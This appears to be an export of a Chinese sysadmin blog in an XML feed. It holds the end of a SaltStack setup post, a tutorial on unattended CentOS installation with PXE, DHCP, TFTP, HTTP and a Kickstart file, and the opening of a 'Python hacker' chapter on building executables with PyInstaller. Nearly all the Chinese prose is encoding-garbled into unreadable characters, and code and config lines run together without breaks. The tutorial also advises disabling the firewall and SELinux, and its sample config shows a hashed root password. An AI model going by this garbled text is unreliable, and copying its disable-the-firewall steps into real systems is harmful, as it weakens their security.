idÔºöminionÁöÑÂîØ‰∏ÄÊ†áÁ§∫ÔºåÈªòËÆ§‰∏∫minionÁöÑhostnameÔºåÂ¶ÇÊûúid‰øÆÊîπ‰∫ÜÔºåmaster ÈúÄË¶ÅÈáçÊñ∞ËÆ§ËØÅ„ÄÇÔºàÈÄöËøátcpdumpÂÅö‰∫Ü‰∏™ÂÆûÈ™åÔºå‰øÆÊîπminion idÂêéÔºåmaster‰∏ä‰ºöÊñ∞Â¢û‰∏Ä‰∏™idÔºå‰ΩÜËÄÅid‰πüËøòÂú®ÔºåÊâßË°åsalt ‚Äò‚Äò test.pingÁöÑÊó∂ÂÄôÔºåÊâßË°åÊó∂Èó¥ÂèòÈïø‰∫ÜÔºåÂª∂ËøüÊó∂Èó¥Á∫¶‰∏∫14sÔºåËÄå‰∏îmaster‰ºöÂú®ÂèëÈÄÅÂëΩ‰ª§ÂêéÂª∂Ëøü10sÂÜçÁªôÊØè‰∏™Â∑≤ÁªèÊâßË°åÊàêÂäüÁöÑminionÂèëÈÄÅ‰∏Ä‰∏™ÂåÖÂπ∂ÊúâminionÊúâËøîÂõûÔºåÂ¶ÇÊûúÊ≤°ÊúâËÄÅidÂ≠òÂú®‰∏ç‰ºöÂèëÈÄÅÔºåÂèØ‰ª•ÁêÜËß£‰∏∫materÂú®ÂêëÊØè‰∏™minionÂØªÊ±ÇÊú™ËøûÊé•ÁöÑidÁöÑ‰ø°ÊÅØÔºåminionÁöÑsaltÊúçÂä°ÂÖ≥Èó≠‰πüÊòØËøôÁßçÊÉÖÂÜµÔºå‰øÆÊîπtimeoutÂÄºÊó†Êïà„ÄÇÔºâ ÊµãËØïÂëΩ‰ª§ ÔºöÊµãËØïÁéØÂ¢É‰∏≠ÂÖ≥Èó≠ iptblesÔºÅÔºÅ 1service iptables stop masterÁ´ØÊâßË°å 12salt-key -L salt-key -A Êü•ÁúãÂà∞minionÁ´ØipË°®Á§∫ÊàêÂäü Accepted Keys:192.168.1.3Denied Keys:Unaccepted Keys:Rejected Keys: 1salt '*' test.ping 192.168.1.3: True Posted by : DY]]></content>
      <categories>
        <category>Ëá™Âä®ÂåñËøêÁª¥</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Saltstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[KickstartÊó†‰∫∫ÂÄºÂÆàÂÆâË£ÖLinux]]></title>
    <url>%2F2016%2F05%2F12%2Flinux-kickstart%2F</url>
    <content type="text"><![CDATA[‰Ωú‰∏∫‰∏≠Â∞èÂÖ¨Âè∏ÁöÑËøêÁª¥ÔºåÁªèÂ∏∏‰ºöÈÅáÂà∞‰∏Ä‰∫õÊú∫Ê¢∞ÂºèÁöÑÈáçÂ§çÂ∑•‰ΩúÔºå‰æãÂ¶ÇÔºöÊúâÊó∂ÂÖ¨Âè∏ÂêåÊó∂‰∏äÁ∫øÂá†ÂçÅÁîöËá≥‰∏äÁôæÂè∞ÊúçÂä°Âô®ÔºåËÄå‰∏îÈúÄË¶ÅÊàë‰ª¨Âú®Áü≠Êó∂Èó¥ÂÜÖÂÆåÊàêÁ≥ªÁªüÂÆâË£Ö„ÄÇ OKËÆ©Êàë‰ª¨Êù•‰∏ÄËµ∑kickstartÂêß 1. ÁÆÄ‰ªãÁêÜËÆ∫ÊÄßÁü•ËØÜÂª∫ËÆÆÂ§ßÊ¶ÇÁúã‰∏ã,ÂÖàÊåâÁÖßÊ≠•È™§ÂÅö‰∏ÄÈÅçÁü•Âà∞Â§ßÊ¶ÇÊÄùË∑Ø,Âú®‰ªîÁªÜÁúã‰ºöÊõ¥Â•Ω(‰∏™‰∫∫Âª∫ËÆÆ) 1) ‰ªÄ‰πàÊòØPXE? PXEÔºåÂÖ®ÂêçPre-boot Execution EnvironmentÔºåÈ¢ÑÂêØÂä®ÊâßË°åÁéØÂ¢ÉÔºõÈÄöËøáÁΩëÁªúÊé•Âè£ÂêØÂä®ËÆ°ÁÆóÊú∫Ôºå‰∏ç‰æùËµñÊú¨Âú∞Â≠òÂÇ®ËÆæÂ§áÔºàÂ¶ÇÁ°¨ÁõòÔºâÊàñÊú¨Âú∞Â∑≤ÂÆâË£ÖÁöÑÊìç‰ΩúÁ≥ªÁªüÔºõÁî±IntelÂíåSystemsoftÂÖ¨Âè∏‰∫é1999Âπ¥9Êúà20Êó•ÂÖ¨Â∏ÉÁöÑÊäÄÊúØÔºõClient/ServerÁöÑÂ∑•‰ΩúÊ®°Âºè:PXEÂÆ¢Êà∑Á´Ø‰ºöË∞ÉÁî®ÁΩëÈôÖÂçèËÆÆ(IP)„ÄÅÁî®Êà∑Êï∞ÊçÆÊä•ÂçèËÆÆ(UDP)„ÄÅÂä®ÊÄÅ‰∏ªÊú∫ËÆæÂÆöÂçèËÆÆ(DHCP)„ÄÅÂ∞èÂûãÊñá‰ª∂‰º†ËæìÂçèËÆÆ(TFTP)Á≠âÁΩëÁªúÂçèËÆÆÔºõPXEÂÆ¢Êà∑Á´Ø(client)Ëøô‰∏™ÊúØËØ≠ÊòØÊåáÊú∫Âô®Âú®PXEÂêØÂä®ËøáÁ®ã‰∏≠ÁöÑËßíËâ≤„ÄÇ‰∏Ä‰∏™PXEÂÆ¢Êà∑Á´ØÂèØ‰ª•ÊòØ‰∏ÄÂè∞ÊúçÂä°Âô®„ÄÅÁ¨îËÆ∞Êú¨ÁîµËÑëÊàñËÄÖÂÖ∂‰ªñË£ÖÊúâPXEÂêØÂä®‰ª£Á†ÅÁöÑÊú∫Âô®ÔºàÊàë‰ª¨ÁîµËÑëÁöÑÁΩëÂç°Ôºâ„ÄÇ 2) PXEÂ∑•‰ΩúËøáÁ®ã 1. PXE ClientÂêëDHCPÂèëÈÄÅËØ∑Ê±ÇPXE Client‰ªéËá™Â∑±ÁöÑPXEÁΩëÂç°ÂêØÂä®ÔºåÈÄöËøáPXE BootROM(Ëá™ÂêØÂä®ËäØÁâá)‰ºö‰ª•UDP(ÁÆÄÂçïÁî®Êà∑Êï∞ÊçÆÊä•ÂçèËÆÆ)ÂèëÈÄÅ‰∏Ä‰∏™ÂπøÊí≠ËØ∑Ê±ÇÔºåÂêëÊú¨ÁΩëÁªú‰∏≠ÁöÑDHCPÊúçÂä°Âô®Á¥¢ÂèñIP„ÄÇ 2. DHCPÊúçÂä°Âô®Êèê‰æõ‰ø°ÊÅØDHCPÊúçÂä°Âô®Êî∂Âà∞ÂÆ¢Êà∑Á´ØÁöÑËØ∑Ê±ÇÔºåÈ™åËØÅÊòØÂê¶Êù•Ëá≥ÂêàÊ≥ïÁöÑPXE ClientÁöÑËØ∑Ê±ÇÔºåÈ™åËØÅÈÄöËøáÂÆÉÂ∞ÜÁªôÂÆ¢Êà∑Á´Ø‰∏Ä‰∏™‚ÄúÊèê‰æõ‚ÄùÂìçÂ∫îÔºåËøô‰∏™‚ÄúÊèê‰æõ‚ÄùÂìçÂ∫î‰∏≠ÂåÖÂê´‰∫Ü‰∏∫ÂÆ¢Êà∑Á´ØÂàÜÈÖçÁöÑIPÂú∞ÂùÄ„ÄÅpxelinuxÂêØÂä®Á®ãÂ∫è(TFTP)‰ΩçÁΩÆÔºå‰ª•ÂèäÈÖçÁΩÆÊñá‰ª∂ÊâÄÂú®‰ΩçÁΩÆ„ÄÇ 3. PXEÂÆ¢Êà∑Á´ØËØ∑Ê±Ç‰∏ãËΩΩÂêØÂä®Êñá‰ª∂ÂÆ¢Êà∑Á´ØÊî∂Âà∞ÊúçÂä°Âô®ÁöÑ‚ÄúÂõûÂ∫î‚ÄùÂêéÔºå‰ºöÂõûÂ∫î‰∏Ä‰∏™Â∏ßÔºå‰ª•ËØ∑Ê±Ç‰º†ÈÄÅÂêØÂä®ÊâÄÈúÄÊñá‰ª∂„ÄÇËøô‰∫õÂêØÂä®Êñá‰ª∂ÂåÖÊã¨Ôºöpxelinux.0„ÄÅpxelinux.cfg/default„ÄÅvmlinuz„ÄÅinitrd.imgÁ≠âÊñá‰ª∂„ÄÇ 4. Boot ServerÂìçÂ∫îÂÆ¢Êà∑Á´ØËØ∑Ê±ÇÂπ∂‰º†ÈÄÅÊñá‰ª∂ÂΩìÊúçÂä°Âô®Êî∂Âà∞ÂÆ¢Êà∑Á´ØÁöÑËØ∑Ê±ÇÂêéÔºå‰ªñ‰ª¨‰πãÈó¥‰πãÂêéÂ∞ÜÊúâÊõ¥Â§öÁöÑ‰ø°ÊÅØÂú®ÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Âô®‰πãÈó¥‰ΩúÂ∫îÁ≠î, Áî®‰ª•ÂÜ≥ÂÆöÂêØÂä®ÂèÇÊï∞„ÄÇBootROMÁî±TFTPÈÄöËÆØÂçèËÆÆ‰ªéBoot Server‰∏ãËΩΩÂêØÂä®ÂÆâË£ÖÁ®ãÂ∫èÊâÄÂøÖÈ°ªÁöÑÊñá‰ª∂(pxelinux.0„ÄÅpxelinux.cfg/default)„ÄÇdefaultÊñá‰ª∂‰∏ãËΩΩÂÆåÊàêÂêéÔºå‰ºöÊ†πÊçÆËØ•Êñá‰ª∂‰∏≠ÂÆö‰πâÁöÑÂºïÂØºÈ°∫Â∫èÔºåÂêØÂä®LinuxÂÆâË£ÖÁ®ãÂ∫èÁöÑÂºïÂØºÂÜÖÊ†∏„ÄÇ 5. ËØ∑Ê±Ç‰∏ãËΩΩËá™Âä®Â∫îÁ≠îÊñá‰ª∂ÂÆ¢Êà∑Á´ØÈÄöËøápxelinux.cfg/defaultÊñá‰ª∂ÊàêÂäüÁöÑÂºïÂØºLinuxÂÆâË£ÖÂÜÖÊ†∏ÂêéÔºåÂÆâË£ÖÁ®ãÂ∫èÈ¶ñÂÖàÂøÖÈ°ªÁ°ÆÂÆö‰Ω†ÈÄöËøá‰ªÄ‰πàÂÆâË£Ö‰ªãË¥®Êù•ÂÆâË£ÖlinuxÔºåÂ¶ÇÊûúÊòØÈÄöËøáÁΩëÁªúÂÆâË£Ö(NFS, FTP, HTTP)ÔºåÂàô‰ºöÂú®Ëøô‰∏™Êó∂ÂÄôÂàùÂßãÂåñÁΩëÁªúÔºåÂπ∂ÂÆö‰ΩçÂÆâË£ÖÊ∫ê‰ΩçÁΩÆ„ÄÇÊé•ÁùÄ‰ºöËØªÂèñdefaultÊñá‰ª∂‰∏≠ÊåáÂÆöÁöÑËá™Âä®Â∫îÁ≠îÊñá‰ª∂ks.cfgÊâÄÂú®‰ΩçÁΩÆÔºåÊ†πÊçÆËØ•‰ΩçÁΩÆËØ∑Ê±Ç‰∏ãËΩΩËØ•Êñá‰ª∂„ÄÇ ËøôÈáåÊúâ‰∏™ÈóÆÈ¢òÔºåÂú®Á¨¨2Ê≠•ÂíåÁ¨¨5Ê≠•ÂàùÂßãÂåñ2Ê¨°ÁΩëÁªú‰∫ÜÔºåËøôÊòØÁî±‰∫éPXEËé∑ÂèñÁöÑÊòØÂÆâË£ÖÁî®ÁöÑÂÜÖÊ†∏‰ª•ÂèäÂÆâË£ÖÁ®ãÂ∫èÁ≠âÔºåËÄåÂÆâË£ÖÁ®ãÂ∫èË¶ÅËé∑ÂèñÁöÑÊòØÂÆâË£ÖÁ≥ªÁªüÊâÄÈúÄÁöÑ‰∫åËøõÂà∂ÂåÖ‰ª•ÂèäÈÖçÁΩÆÊñá‰ª∂„ÄÇÂõ†Ê≠§PXEÊ®°ÂùóÂíåÂÆâË£ÖÁ®ãÂ∫èÊòØÁõ∏ÂØπÁã¨Á´ãÁöÑÔºåPXEÁöÑÁΩëÁªúÈÖçÁΩÆÂπ∂‰∏çËÉΩ‰º†ÈÄíÁªôÂÆâË£ÖÁ®ãÂ∫èÔºå‰ªéËÄåËøõË°å‰∏§Ê¨°Ëé∑ÂèñIPÂú∞ÂùÄËøáÁ®ãÔºå‰ΩÜIPÂú∞ÂùÄÂú®DHCPÁöÑÁßüÊúüÂÜÖÊòØ‰∏ÄÊ†∑ÁöÑ„ÄÇ 6. ÂÆ¢Êà∑Á´ØÂÆâË£ÖÊìç‰ΩúÁ≥ªÁªüÂ∞Üks.cfgÊñá‰ª∂‰∏ãËΩΩÂõûÊù•ÂêéÔºåÈÄöËøáËØ•Êñá‰ª∂ÊâæÂà∞OS ServerÔºåÂπ∂ÊåâÁÖßËØ•Êñá‰ª∂ÁöÑÈÖçÁΩÆËØ∑Ê±Ç‰∏ãËΩΩÂÆâË£ÖËøáÁ®ãÈúÄË¶ÅÁöÑËΩØ‰ª∂ÂåÖ„ÄÇOS ServerÂíåÂÆ¢Êà∑Á´ØÂª∫Á´ãËøûÊé•ÂêéÔºåÂ∞ÜÂºÄÂßã‰º†ËæìËΩØ‰ª∂ÂåÖÔºåÂÆ¢Êà∑Á´ØÂ∞ÜÂºÄÂßãÂÆâË£ÖÊìç‰ΩúÁ≥ªÁªü„ÄÇÂÆâË£ÖÂÆåÊàêÂêéÔºåÂ∞ÜÊèêÁ§∫ÈáçÊñ∞ÂºïÂØºËÆ°ÁÆóÊú∫„ÄÇ 2. ÂÆâË£ÖDHCPÊúçÂä°Â¶ÇÊûúÊòØÁî®ËôöÊãüÊú∫ÊµãËØïÈúÄË¶ÅÂÖ≥Èó≠ËôöÊãüÁΩëÂç°DHCPÂäüËÉΩ 1) ÂÆâË£ÖÂåÖ123456[root@CentOS6.5 ~]# yum -y install dhcp[root@CentOS6.5 ~]# rpm -ql dhcp |grep "dhcpd.conf"/etc/dhcp/dhcpd.conf # Êü•ÁúãÈÖçÁΩÆÊñá‰ª∂‰ΩçÁΩÆ/usr/share/doc/dhcp-4.1.1/dhcpd-conf-to-ldap/usr/share/doc/dhcp-4.1.1/dhcpd.conf.sample/usr/share/man/man5/dhcpd.conf.5.gz 2) ÁºñËæëÈÖçÁΩÆÊñá‰ª∂[root@CentOS6.5 ~]# vim /etc/dhcp/dhcp.conf 123456789default-lease-time 14400;ddns-update-style none;next-server 192.168.1.52; #ÊåáÂÆötftpdÊúçÂä°Âô®ipfilename "pxelinux.0";subnet 192.168.1.0 netmask 255.255.255.0 &#123; #Âú∞ÂùÄÊ±† range 192.168.1.50 192.168.1.240; default-lease-time 14400; # ËÆæÁΩÆÈªòËÆ§ÁöÑIPÁßüÁî®ÊúüÈôê max-lease-time 172800;&#125; [root@CentOS6.5 ~]# vim /etc/sysconfig/dhcpd 1DHCPDARGS=eth1 # ÊåáÂÆöÁõëÂê¨ÁΩëÂç° [root@CentOS6.5 ~]# service dhcpd restart 3. ÂÆâË£ÖTFTP1) TFTPÁÆÄ‰ªã:TFTPÔºàTrivial File Transfer Protocol,ÁÆÄÂçïÊñá‰ª∂‰º†ËæìÂçèËÆÆÔºâÊòØTCP/IPÂçèËÆÆÊóè‰∏≠ÁöÑ‰∏Ä‰∏™Áî®Êù•Âú®ÂÆ¢Êà∑Êú∫‰∏éÊúçÂä°Âô®‰πãÈó¥ËøõË°åÁÆÄÂçïÊñá‰ª∂‰º†ËæìÁöÑÂçèËÆÆÔºåÊèê‰æõ‰∏çÂ§çÊùÇ„ÄÅÂºÄÈîÄ‰∏çÂ§ßÁöÑÊñá‰ª∂‰º†ËæìÊúçÂä°„ÄÇÁ´ØÂè£Âè∑‰∏∫69„ÄÇ 2) TFTPÂÆâË£ÖÈÖçÁΩÆ1234567891011121314151617181920[root@CentOS6.5 ~]# yum -y install tftp-server[root@CentOS6.5 ~]# vim /etc/xinetd.d/tftpservice tftp&#123; socket_type = dgram protocol = udp wait = yes user = root server = /usr/sbin/in.tftpd server_args = -s /var/lib/tftpboot # ÊåáÂÆöÁõÆÂΩïÔºå‰øùÊåÅÈªòËÆ§Ôºå‰∏çÁî®‰øÆÊîπ disable = no # Áî±ÂéüÊù•ÁöÑyesÊîπ‰∏∫no per_source = 11 cps = 100 2 flags = IPv4&#125;[root@CentOS6.5 ~]# /etc/init.d/xinetd restartStopping xinetd: [FAILED]Starting xinetd: [ OK ][root@CentOS6.5 ~]# netstat -tunlp|grep 69udp 0 0 0.0.0.0:69 0.0.0.0:* 1106/xinetd 4. ÂÆâË£ÖHTTPÊúçÂä°ÂèØ‰ª•Áî®ApacheÊàñNginxÊèê‰æõHTTPÊúçÂä°„ÄÇPythonÁöÑÂëΩ‰ª§webÊúçÂä°‰∏çË°åÔºå‰ºöÊúâÊä•Èîô„ÄÇ 12345678910111213[root@CentOS6.5 ~]# yum -y install httpd[root@CentOS6.5 ~]# sed -i "277i ServerName 127.0.0.1:80" /etc/httpd/conf/httpd.conf[root@CentOS6.5 ~]# /etc/init.d/httpd start[root@CentOS6.5 ~]# mkdir /var/www/html/CentOS-6.5[root@CentOS6.5 ~]# mount /dev/sr0 /var/www/html/CentOS-6.5/ #sr0ÊµãËØïËôöÊãüÊú∫ÁéØÂ¢ÉÁ∫ø‰∏ä‰ºö‰∏çÂêåmount: block device /dev/sr0 is write-protected, mounting read-only[root@CentOS6.5 ~]# df -hFilesystem Size Used Avail Use% Mounted on/dev/sda3 19G 2.4G 16G 14% /tmpfs 491M 16K 491M 1% /dev/shm/dev/sda1 190M 36M 145M 20% /boot/dev/sr0 3.7G 3.7G 0 100% /var/www/html/CentOS-6.5# ‰∏çÁÆ°ÊÄé‰πàÂºÑÔºåÂè™Ë¶ÅÊääÂÆâË£ÖÂÖâÁõòÂÜÖÂÆπËÉΩÈÄöËøáwebÂèëÂ∏ÉÂç≥ÂèØ„ÄÇÂõ†‰∏∫ÊòØÊºîÁ§∫ÔºåÂ¶ÇÊûúÂ§çÂà∂ÈïúÂÉèÂ∞±ÊúâÁÇπÊµ™Ë¥πÊó∂Èó¥„ÄÇ‰ΩÜÁîü‰∫ßÁéØÂ¢ÉÂ∞±‰∏ÄÂÆöË¶ÅÂ§çÂà∂‰∫ÜÔºåÂÖâÁõòËØªÂèñÈÄüÂ∫¶ÊúâÈôê„ÄÇ ÊµèËßàÂô®ËÆøÈóÆÊµãËØïÈÖçÁΩÆÊòØÂê¶ÊàêÂäühttp://IP/CentOS-6.5 5. ÈÖçÁΩÆÊîØÊåÅPXEÁöÑÂêØÂä®Á®ãÂ∫èsyslinuxÊòØ‰∏Ä‰∏™ÂäüËÉΩÂº∫Â§ßÁöÑÂºïÂØºÂä†ËΩΩÁ®ãÂ∫èÔºåËÄå‰∏îÂÖºÂÆπÂêÑÁßç‰ªãË¥®„ÄÇSYSLINUXÊòØ‰∏Ä‰∏™Â∞èÂûãÁöÑLinuxÊìç‰ΩúÁ≥ªÁªüÔºåÂÆÉÁöÑÁõÆÁöÑÊòØÁÆÄÂåñÈ¶ñÊ¨°ÂÆâË£ÖLinuxÁöÑÊó∂Èó¥ÔºåÂπ∂Âª∫Á´ã‰øÆÊä§ÊàñÂÖ∂ÂÆÉÁâπÊÆäÁî®ÈÄîÁöÑÂêØÂä®Áõò„ÄÇÂ¶ÇÊûúÊ≤°ÊúâÊâæÂà∞pxelinux.0Ëøô‰∏™Êñá‰ª∂,ÂèØ‰ª•ÂÆâË£Ö‰∏Ä‰∏ã„ÄÇ 12345678910[root@CentOS6.5 ~]# yum -y install syslinux[root@CentOS6.5 ~]# cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/# Â§çÂà∂ÂêØÂä®ËèúÂçïÁ®ãÂ∫èÊñá‰ª∂[root@CentOS6.5 ~]# cp -a /var/www/html/CentOS-6.5/isolinux/* /var/lib/tftpboot/[root@CentOS6.5 ~]# ls /var/lib/tftpboot/boot.cat grub.conf isolinux.bin memtest splash.jpg vesamenu.c32boot.msg initrd.img isolinux.cfg pxelinux.0 TRANS.TBL vmlinuz# Êñ∞Âª∫‰∏Ä‰∏™pxelinux.cfgÁõÆÂΩïÔºåÂ≠òÊîæÂÆ¢Êà∑Á´ØÁöÑÈÖçÁΩÆÊñá‰ª∂„ÄÇ[root@CentOS6.5 ~]# mkdir -p /var/lib/tftpboot/pxelinux.cfg[root@CentOS6.5 ~]# cp /var/www/html/CentOS-6.5/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default 6. ÊµãËØïÊâãÂä®ÁΩëÁªúÂÆâË£ÖÂºÄÂêØ‰∏Ä‰∏™Êñ∞ÁöÑËôöÊãüÊú∫ÂÜÖÂ≠òÁªô1GB,‰∏çÂá∫ÈîôËØØ‰ºöÁúãÂà∞ÂÖâÁõòÂÆâË£ÖÁïåÈù¢, Êé•‰∏ãÊù•Â∞±ÊòØÂàõÂª∫ks.cfg‰∫Ü. ÂÖ≥Èó≠ÊµãËØïËôöÊãüÊú∫,ÁªßÁª≠ 7. ÂàõÂª∫ks.cfgÊñá‰ª∂ ÈÄöÂ∏∏ÔºåÊàë‰ª¨Âú®ÂÆâË£ÖÊìç‰ΩúÁ≥ªÁªüÁöÑËøáÁ®ã‰∏≠ÔºåÈúÄË¶ÅÂ§ßÈáèÁöÑÂíåÊúçÂä°Âô®‰∫§‰∫íÊìç‰ΩúÔºå‰∏∫‰∫ÜÂáèÂ∞ëËøô‰∏™‰∫§‰∫íËøáÁ®ãÔºåkickstartÂ∞±ËØûÁîü‰∫Ü„ÄÇ‰ΩøÁî®ËøôÁßçkickstartÔºåÂè™ÈúÄ‰∫ãÂÖàÂÆö‰πâÂ•Ω‰∏Ä‰∏™KickstartËá™Âä®Â∫îÁ≠îÈÖçÁΩÆÊñá‰ª∂ks.cfgÔºàÈÄöÂ∏∏Â≠òÊîæÂú®ÂÆâË£ÖÊúçÂä°Âô®‰∏äÔºâÔºåÂπ∂ËÆ©ÂÆâË£ÖÁ®ãÂ∫èÁü•ÈÅìËØ•ÈÖçÁΩÆÊñá‰ª∂ÁöÑ‰ΩçÁΩÆÔºåÂú®ÂÆâË£ÖËøáÁ®ã‰∏≠ÂÆâË£ÖÁ®ãÂ∫èÂ∞±ÂèØ‰ª•Ëá™Â∑±‰ªéËØ•Êñá‰ª∂‰∏≠ËØªÂèñÂÆâË£ÖÈÖçÁΩÆÔºåËøôÊ†∑Â∞±ÈÅøÂÖç‰∫ÜÂú®ÂÆâË£ÖËøáÁ®ã‰∏≠Â§öÊ¨°ÁöÑ‰∫∫Êú∫‰∫§‰∫íÔºå‰ªéËÄåÂÆûÁé∞Êó†‰∫∫ÂÄºÂÆàÁöÑËá™Âä®ÂåñÂÆâË£Ö„ÄÇ ÁîüÊàêkickstartÈÖçÁΩÆÊñá‰ª∂ÁöÑ‰∏âÁßçÊñπÊ≥ïÔºö ÊñπÊ≥ï1„ÄÅ ÊØèÂÆâË£ÖÂ•Ω‰∏ÄÂè∞CentosÊú∫Âô®ÔºåCentosÂÆâË£ÖÁ®ãÂ∫èÈÉΩ‰ºöÂàõÂª∫‰∏Ä‰∏™kickstartÈÖçÁΩÆÊñá‰ª∂ÔºåËÆ∞ÂΩï‰Ω†ÁöÑÁúüÂÆûÂÆâË£ÖÈÖçÁΩÆ„ÄÇÂ¶ÇÊûú‰Ω†Â∏åÊúõÂÆûÁé∞ÂíåÊüêÁ≥ªÁªüÁ±ª‰ººÁöÑÂÆâË£ÖÔºåÂèØ‰ª•Âü∫‰∫éËØ•Á≥ªÁªüÁöÑkickstartÈÖçÁΩÆÊñá‰ª∂Êù•ÁîüÊàê‰Ω†Ëá™Â∑±ÁöÑkickstartÈÖçÁΩÆÊñá‰ª∂„ÄÇÔºàÁîüÊàêÁöÑÊñá‰ª∂ÂêçÂ≠óÂè´anaconda-ks.cfg‰Ωç‰∫é/root/anaconda-ks.cfgÔºâ ÊñπÊ≥ï2„ÄÅCentosÊèê‰æõ‰∫Ü‰∏Ä‰∏™ÂõæÂΩ¢ÂåñÁöÑkickstartÈÖçÁΩÆÂ∑•ÂÖ∑„ÄÇÂú®‰ªª‰Ωï‰∏Ä‰∏™ÂÆâË£ÖÂ•ΩÁöÑLinuxÁ≥ªÁªü‰∏äËøêË°åËØ•Â∑•ÂÖ∑ÔºåÂ∞±ÂèØ‰ª•ÂæàÂÆπÊòìÂú∞ÂàõÂª∫‰Ω†Ëá™Â∑±ÁöÑkickstartÈÖçÁΩÆÊñá‰ª∂„ÄÇkickstartÈÖçÁΩÆÂ∑•ÂÖ∑ÂëΩ‰ª§‰∏∫rsystem-config-kickstart,ÁΩë‰∏äÊúâÂæàÂ§öÁî®CentOSÊ°åÈù¢ÁâàÁîüÊàêksÊñá‰ª∂ÁöÑÊñáÁ´†ÔºåÂ¶ÇÊûúÊúâÁé∞ÊàêÁöÑÁ≥ªÁªüÂ∞±Ê≤°‰ªÄ‰πàÂèØËØ¥„ÄÇ‰ΩÜÊ≤°ÊúâÁé∞ÊàêÁöÑÔºå‰πüÊ≤°ÊúâÂøÖË¶ÅÂéªÁî®Ê°åÈù¢ÁâàÔºåÂëΩ‰ª§Ë°å‰πüÂæàÁÆÄÂçï„ÄÇ ÊñπÊ≥ï3„ÄÅÈòÖËØªkickstartÈÖçÁΩÆÊñá‰ª∂ÁöÑÊâãÂÜå„ÄÇÁî®‰ªª‰Ωï‰∏Ä‰∏™ÊñáÊú¨ÁºñËæëÂô®ÈÉΩÂèØ‰ª•ÂàõÂª∫‰Ω†Ëá™Â∑±ÁöÑkickstartÈÖçÁΩÆÊñá‰ª∂„ÄÇ ËøôÈáåË¥¥Âá∫ÊàëÁöÑks.cfg,Ëøô‰∏™ÊòØCentOS6.8ÁöÑ,ÂèØ‰ª•Ê†πÊçÆÈúÄÊ±ÇÊõ¥Êîπ ËøôÈáåÊòØÂÆòÊñπÊñáÊ°£ËØ¶Ëß£ks.cfgÈÖçÁΩÆÊñá‰ª∂ËØ≠Âè•CentOS 123456789101112131415161718192021222324252627282930313233343536#platform=x86, AMD64, Êàñ Intel EM64T#version=DEVEL# Firewall configurationfirewall --enabled --http --ssh# Install OS instead of upgradeinstall# Use network installationurl --url="http://192.168.1.52/CentOS6.5"# Root passwordrootpw --iscrypted $1$xn3sYOAA$jOfmmjxxYA/IRjFm0BM5O0# System authorization informationauth --useshadow --passalgo=sha512# Use graphical installgraphical# System keyboardkeyboard us# System languagelang zh_CN# SELinux configurationselinux --enforcing# Do not configure the X Window Systemskipx# Installation logging levellogging --level=info# System timezonetimezone Africa/Libreville# System bootloader configurationbootloader --location=mbr# Partition clearing informationclearpart --all %packages@php%end 8. Êï¥ÂêàDefaultÈÖçÁΩÆÊñá‰ª∂ÂÆûÁé∞Êó†‰∫∫ÂÄºÂÆàvim /var/lib/tftpboot/pxelinux.cfg/default 1234567default ksprompt 0label ks kernel vmlinuz append initrd=initrd.img ks=http://192.168.1.52/ks_config/CentOS-6.5-ks.cfg # ÂëäËØâÂÆâË£ÖÁ®ãÂ∫èks.cfgÊñá‰ª∂Âú®Âì™Èáå# append initrd=initrd.img ks=http://192.168.1.52/ks_config/CentOS-6.5-ks.cfg ksdevice=eth0# ksdevice=eth0‰ª£Ë°®ÂΩìÂÆ¢Êà∑Á´ØÊúâÂ§öÂùóÁΩëÂç°ÁöÑÊó∂ÂÄôÔºåË¶ÅÂÆûÁé∞Ëá™Âä®ÂåñÈúÄË¶ÅËÆæÁΩÆ‰ªéeth1ÂÆâË£ÖÔºå‰∏çÊåáÂÆöÁöÑËØùÔºåÂÆâË£ÖÁöÑÊó∂ÂÄôÁ≥ªÁªü‰ºöËÆ©‰Ω†ÈÄâÊã©ÔºåÈÇ£Â∞±‰∏çÂè´ÂÖ®Ëá™Âä®Âåñ‰∫Ü 9. ÊâìÂºÄÁ≥ªÁªüÁîµÊ∫ê,Âá∫ÂéªÂêÉ‰∏™È•≠,Ëøá‰ºöÂõûÊù•,Á≥ªÁªüÂ∞±‰ª•ÁªèË£ÖÂ•Ω‰∫ÜÂÖ≥Èó≠ÊúçÂä°Á´ØÁöÑiptables,selinux 12service iptables stopsetenforce 0 ÂÖ∂cobbler‰πüÂèØÂÆûÁé∞Êó†‰∫∫ÂÄºÂÆà,Â±û‰∫éÂ∑•ÂÖ∑]]></content>
      <categories>
        <category>Ëá™Âä®ÂåñËøêÁª¥</category>
        <category>Tools</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PythonÈªëÂÆ¢‰πãÊóÖ0x5]]></title>
    <url>%2F2015%2F10%2F17%2Fpythonhacker_0x5%2F</url>
    <content type="text"><![CDATA[‰ΩøÁî®PyInstallerÁîüÊàêÂèØ‰ª•ÊâßË°åÁ®ãÂ∫èËøô‰∏ÄÁ´†ÊòØÊïôÂ§ßÂÆ∂Â¶Ç‰ΩïÊääËá™Â∑±ÁöÑpythonËÑöÊú¨ÁºñËØëÊàêwindows‰∏ãÂèØÊâßË°åÊñá‰ª∂ÔºåÂÆÉÂèØ‰ª•ËÆ©‰Ω†ÁöÑpythonËÑöÊú¨Ë∑®Âπ≥Âè∞ÂéªËøêË°åÔºåÂπ∂‰∏î‰∏çÈúÄË¶ÅÂéªÂÆâË£ÖpythonËß£ÈáäÂô®„ÄÇÈ¶ñÂÖàÊàë‰ª¨ÈúÄË¶Å‰∏ãËΩΩ‰æùËµñÂåÖ,cygwin(ÊàñËÄÖÂÖ∂‰ªñÁöÑÂ∑•ÂÖ∑‰πüÂèØ‰ª•ÔºåËøôÈáåÊàë‰ª¨‰ΩøÁî®Pywin). PythonËΩ¨exeÂÆâË£ÖLinux: sudo apt-get install python2.7 build-essential python-dev zlib1g-dev upx Windows: http://www.activestate.com/activepython (fully packaged installer file) ÂÆâË£Ö Pywin32, Setuptools, PyInstaller ÂÆâË£ÖÂÆåÊàê‰πãÂêé‰∏ã‰∏ÄÊ≠•Êàë‰ª¨Â∞±ËøêË°åpythonÂëΩ‰ª§ÁîüÊàêÂèØÊâßË°åÊñá‰ª∂: 1python pyinstaller.py --onefile &lt;scriptName&gt; 